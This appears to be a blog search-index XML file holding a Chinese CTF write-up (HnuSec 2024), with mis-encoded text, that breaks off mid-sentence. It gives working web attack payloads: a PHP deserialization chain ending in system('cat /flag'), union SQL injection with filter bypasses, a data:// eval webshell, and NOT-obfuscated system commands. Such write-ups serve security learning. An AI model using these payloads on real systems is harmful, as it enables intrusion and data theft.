<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HnuSec 2024 CTF</title>
    <link href="/2024/08/17/HnuSec%202024%20CTF/"/>
    <url>/2024/08/17/HnuSec%202024%20CTF/</url>
    
    <content type="html"><![CDATA[<p><a name="Xdi9k"></a></p><h1 id="æˆ˜å†µ"><a href="#æˆ˜å†µ" class="headerlink" title="æˆ˜å†µ"></a>æˆ˜å†µ</h1><p>ä¸¤ä¸ªäºŒè¡€ä¸€ä¸ªä¸€è¡€ï¼Œæœ‰ä¸€é¢˜é¢˜ç›®å‡ºé—®é¢˜äº†å¯¼è‡´æ²¡èƒ½æ‹¿ä¸‹<br>å‡ºé¢˜äººè¯´ç®—æˆ‘akäº†å¥½å§<br>![](HnuSec 2024 CTF&#x2F;1.png)<br><a name="OYT9Y"></a></p><h1 id="What-Do-You-Want"><a href="#What-Do-You-Want" class="headerlink" title="What Do You Want!"></a>What Do You Want!</h1><p>![](HnuSec 2024 CTF&#x2F;2.png)<br>çœ‹æ ·å­åº”è¯¥æ˜¯<code>robotx.txt</code>åè®®äº†<br>![](HnuSec 2024 CTF&#x2F;3.png)<br>é‚£ä¹ˆè®¿é—®<code>/The_Deep_Ends</code>çœ‹çœ‹<br>![](HnuSec 2024 CTF&#x2F;4.png)<br>é‚£ä¹ˆå°±æ˜¯XFFäº†ï¼Œå¯æƒœä¸è¡Œï¼Œç”¨bpçˆ†ç ´å‡ºæ¥æ˜¯X-Client-IP: 127.0.0.1<br>ç„¶åå°±æ˜¯ä¸€ç³»åˆ—çš„httpçš„ä¸œè¥¿äº†å°±ç›´æ¥æ”¾payloadäº†ï¼Œè¿™é‡Œçš„Viaä¹Ÿæ˜¯æŒºæŠ˜ç£¨æˆ‘çš„ï¼Œä»¥å‰æ²¡è§è¿‡ç„¶åæ‰¾äº†å¥½ä¹…è€Œä¸”æ‚Ÿç©ºå®˜ç½‘è·¯å¾„å¿˜è®°åŠ wwwä¸€ç›´é”™ï¼Œç»™æˆ‘æ•´çš„å¿«åè¡€äº†<br>![](HnuSec 2024 CTF&#x2F;5.png)<br>è®¿é—®<code>/The_Golden_Light</code><br>![](HnuSec 2024 CTF&#x2F;6.png)<br>é‚£ä¹ˆå°±æ˜¯ç®€å•çš„<code>cookie</code>ä¼ å‚äº†<br>![](HnuSec 2024 CTF&#x2F;7.png)<br><a name="ldBOR"></a></p><h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>è¿›æ¥æç¤ºï¼Œæ„Ÿè§‰æ˜¯cookieéªŒè¯<br>![](HnuSec 2024 CTF&#x2F;8.png)<br>æ‰“å¼€hackerä¸€çœ‹æœç„¶æ˜¯ï¼Œå§cookieé‡Œé¢çš„å€¼æ”¹æˆadminå°±è¿‡å»äº†<br>![](HnuSec 2024 CTF&#x2F;9.png)<br><strong>è®¿é—®&#x2F;hhhheelllloooo.phpå°±æ˜¯æºç äº†</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WOWO</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$nano</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hahaha</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evn</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;evn-&gt;<span class="hljs-keyword">do</span>=<span class="hljs-string">&#x27;do you know serialize?&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hahaha;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Soga</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asdj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;asdj-&gt;nano;<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;grape=<span class="hljs-string">&#x27;123&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;are you sure?&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> ;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> ;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$Love</span>=<span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$Love</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable language_">$this</span>-&gt;b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;it&#x27;s too esay,yet?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NANI</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$so</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$star</span>,<span class="hljs-variable">$bob</span></span>)</span>&#123;<br>        <span class="hljs-variable">$str</span>=<span class="hljs-variable language_">$this</span>-&gt;lal;<br>        <span class="hljs-variable">$str</span>();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dman</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;apple;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable">$des</span>=<span class="hljs-variable language_">$this</span>-&gt;strawberry;<br>        <span class="hljs-variable">$des</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hnu</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sun</span>=<span class="hljs-string">&#x27;HnuSec is very good&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$setad</span>=<span class="hljs-string">&#x27;do you think so?&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;setad=<span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Thank you,have a fun.&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Hnu&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Hnu&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å¼€å§‹æ„é€ popé“¾ï¼Œä¸‹é¢æ˜¯æˆ‘æ„é€ çš„ï¼Œæ³¨æ„æ˜¯åè¿‡æ¥çš„<br><code>H_tostring-&gt;WOWO_get-&gt;Soga_invoke-&gt;NANI_set-&gt;WOWO_destruct</code><br>å…¶ä»–çš„é­”æœ¯æ–¹æ³•ä¸‹é¢æ²¡æœ‰å¯æ§å‚æ•°å¤§äº2çš„ï¼Œäºæ˜¯å°±åªå‰©Hç±»ä¸‹é¢çš„toStringäº†<br>é‚£ä¹ˆçœ‹çœ‹æˆ‘çš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//H_tostring-&gt;WOWO_get-&gt;Soga_invoke-&gt;NANI_set-&gt;WOWO_destruct</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WOWO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$nano</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hahaha</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evn</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Soga</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asdj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;create_function&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;&#125;system(&#x27;cat /flag&#x27;);//&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NANI</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$so</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOWO</span>();<br><span class="hljs-variable">$a</span>-&gt;evn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NANI</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Soga</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal-&gt;asdj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOWO</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal-&gt;asdj-&gt;hahaha = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æˆåŠŸæ‹¿åˆ°flag</strong><br>![](HnuSec 2024 CTF&#x2F;10.png)<br><a name="yJRCM"></a></p><h1 id="è°¢è°¢çš®è›‹ğŸ¥š"><a href="#è°¢è°¢çš®è›‹ğŸ¥š" class="headerlink" title="è°¢è°¢çš®è›‹ğŸ¥š"></a>è°¢è°¢çš®è›‹ğŸ¥š</h1><p>æˆ‘è¿›æ¥å°±æ˜¯ä¼ ä¸€ä¸ª1,ç„¶åæŠ¥é”™æç¤ºï¼Œçœ‹æ¥æ˜¯æ•°å­—æ³¨å…¥<br>![](HnuSec 2024 CTF&#x2F;11.png)<br>ç„¶åå°±å¼€å§‹èµ°æµç¨‹<br>è¾“å…¥<code>1 group by 2#</code>çˆ†åˆ—æ•°&#x2F;&#x2F;ä¸¤åˆ—<br>è¾“å…¥<code>1 union select 1,2#</code>æŠ¥é”™å¦‚ä¸‹<br>![](HnuSec 2024 CTF&#x2F;12.png)<br>çŒœæµ‹æ˜¯unionè¢«æ›¿æ¢äº†äºæ˜¯<br>è¾“å…¥<code>-11 ununionion select 1,2#</code>çˆ†å›æ˜¾ä½ç½®<br>è¾“å…¥<code>-11 ununionion select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>çˆ†è¡¨åï¼Œå‘ç°&#x3D;è¢«è¿‡æ»¤äº†ï¼Œç»•è¿‡ä¸€ä¸‹<br>è¾“å…¥<code>-11 ununionion select 1,group_concat(table_name) from information_schema.tables where table_schema like database()#</code><br>![](HnuSec 2024 CTF&#x2F;13.png)<br>è¾“å…¥<code>-11 ununionion select 1,group_concat(column_name) from information_schema.columns where table_schema like database()#</code>çˆ†åˆ—åå­—<br>![](HnuSec 2024 CTF&#x2F;14.png)<br>çœ‹ç»„åˆå°±æ˜¯æ¯ä¸ªè¡¨ä¸‰åˆ—äº†<br>è¾“å…¥<code>-11 ununionion select 1,group_concat(des,&#39;~&#39;,value) from F149#</code><br>![](HnuSec 2024 CTF&#x2F;15.png)<br><a name="RaxKw"></a></p><h1 id="æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»ŸPlus"><a href="#æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»ŸPlus" class="headerlink" title="æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»ŸPlus"></a>æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»ŸPlus</h1><p>çœ‹ä¸€ä¸‹æºç å‘ç°ç”¨æˆ·å<br>![](HnuSec 2024 CTF&#x2F;16.png)<br><strong>ç”¨é¢˜ç›®ç»™çš„å­—å…¸çˆ†ç ´å°±å¥½äº†ï¼Œæ˜¾è€Œæ˜“è§çš„å¯†ç </strong><br>![](HnuSec 2024 CTF&#x2F;17.png)<br><strong>è¿›æ¥äº†å°±éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿</strong><br>![](HnuSec 2024 CTF&#x2F;18.png)<br>![](HnuSec 2024 CTF&#x2F;19.png)<br>è¿™å¯†ç å°±è—åœ¨æºç é‡Œï¼Œæ”¾åˆ°hackeré‡Œbase64è§£ç ä¸€ä¸‹ï¼Œç„¶åè¾“å…¥<br>![](HnuSec 2024 CTF&#x2F;20.png)<br>æ‹¿åˆ°åœ°å€&#x2F;Ewoji&#x2F;final0012llsnn.phpï¼Œè®¿é—®å‘ç°æ˜¯æ–‡ä»¶åŒ…å«çš„é¢˜ç›®ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&lt;|\?|php|&gt;|echo|filter|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;dangerous function detect!&quot;</span>);<br>    &#125;;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>banæ‰äº†filterï¼Œå¹¶ä¸”å‚æ•°æ˜¯dataï¼ŒçŒœæµ‹ç”¨</p><p><strong>data:&#x2F;&#x2F;</strong><br>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p>ç„¶åbanäº†å¥½å¤šä¸œè¥¿ï¼Œæƒ³æ‰§è¡Œå‘½ä»¤åªèƒ½ç”¨base64ç¼–ç çš„å½¢å¼äº†<br>ä¼ å…¥<code>?data=data://text/plain;base64,&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);  &lt;/script&gt;</code><br>ï¼ˆè¿™é‡Œåé¢æ²¡ç¼–ç æ˜¯ä¸ºäº†å¤§å®¶çœ‹æ¸…æ¥šï¼Œå®é™…ä½¿ç”¨éœ€è¦base64ç¼–ç ï¼Œä¸‹åŒï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2024/png/42549390/1723802141416-b083ec65-0041-42d7-9700-746aa3f77e40.png#averageHue=%231e1e27&clientId=u159ad21e-650b-4&from=paste&height=116&id=u77d22287&originHeight=174&originWidth=963&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36808&status=done&style=none&taskId=u1e8dc135-ea30-4536-8285-2239ff42d94&title=&width=642" alt="image.png"><br>ä¼ è¿›å»åå°ä¼šæŠŠä¸€ä¸ªâ€™&gt;â€™åƒäº†ï¼ŒçŒœæµ‹æœ‰waf<br>æ‰€ä»¥ä¼ å…¥<code>?data=data://text/plain;base64,&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/42549390/1723801819400-47a26032-5075-4156-95ab-ad755241c895.png#averageHue=%23fcfbfb&clientId=u78575868-ba29-4&from=paste&height=645&id=ub2cfe0ef&originHeight=968&originWidth=1339&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=92076&status=done&style=none&taskId=u1e6f3d00-d2c5-4a36-8b63-e520cdf7063&title=&width=892.6666666666666" alt="image.png"><br>ä¹‹åå°±æ˜¯ç”¨catè¯»flagäº†<br><a name="D2aOM"></a></p><h1 id="æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»Ÿ"><a href="#æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»Ÿ"></a>æµ·åŒ—å¤§å­¦åå°ç®¡ç†ç³»ç»Ÿ</h1><p>è¿›æ¥å°±æ˜¯å’Œä¸Šé¢plusä¸€æ ·çš„ç•Œé¢ï¼Œä¸è¿‡è¿™æ¬¡ä¸œè¥¿å…¨åœ¨æºç é‡Œ![](HnuSec 2024 CTF&#x2F;21.png)<br>ç¬¬äºŒå…³ä¹Ÿæ˜¯çœ‹æºç å‘ç°base64ç¼–ç çš„å¯†ç <br>å’Œpulsä¸€æ ·çš„æ­¥éª¤ä¸å¤šè§£é‡Š<br>è®¿é—®&#x2F;Ewoji&#x2F;final.phpï¼Œå±•ç¤ºæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//æˆ‘æ˜¯ä½•æ™¨å…‰ï¼Œæˆ‘ä¸æƒ³åœ¨æˆ˜åœºä¸Šæ•Œäººæ¡åˆ°æˆ‘çš„åé—¨å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘å†³å®šåŠ ç‚¹é™åˆ¶</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num1&#x27;</span>];<br>    <span class="hljs-variable">$num2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num1</span>!=<span class="hljs-variable">$num2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$num1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$num2</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç»§ç»­å§&quot;</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|\*|\_|tac|less|more|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>md5ç›´æ¥é€‰æ‹©æ•°ç»„ç»•è¿‡</strong><br>![](HnuSec 2024 CTF&#x2F;22.png)<br>çœ‹äº†ä¸€ä¸‹å‘ç°æ²¡è¿‡æ»¤â€™~â€™ï¼Œç›´æ¥é€‰æ‹©å–åç»•è¿‡ï¼Œè„šæœ¬å¦‚ä¸‹ï¼ˆä½¿ç”¨å‰è®°å¾—æ›´æ”¹ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;(eval($_POST[cmd]))&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>?cmd=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code><br>å®é™…å°±æ˜¯<code>system(&quot;ls /&quot;);</code><br>![](HnuSec 2024 CTF&#x2F;23.png)<br>è¾“å…¥<code>?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%99%99%99%93%9E%98);</code><br>å®é™…å°±æ˜¯<code>system(&quot;cat /fffflag&quot;);</code><br>æ‹¿åˆ°ä¸€é•¿ä¸²</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç»§ç»­å§æ­å–œä½ æ‰¾åˆ°flagï¼æˆ‘è´Ÿè´£ä»»çš„å‘Šè¯‰ä½ ,secret:åé¢çš„å­—ç¬¦æ˜¯ä½ éœ€è¦çš„ä¸œè¥¿ï¼Œä½†EWOJIäº”ä¸ªå¤§å†™å­—ç¬¦ä¸æ˜¯ä½ 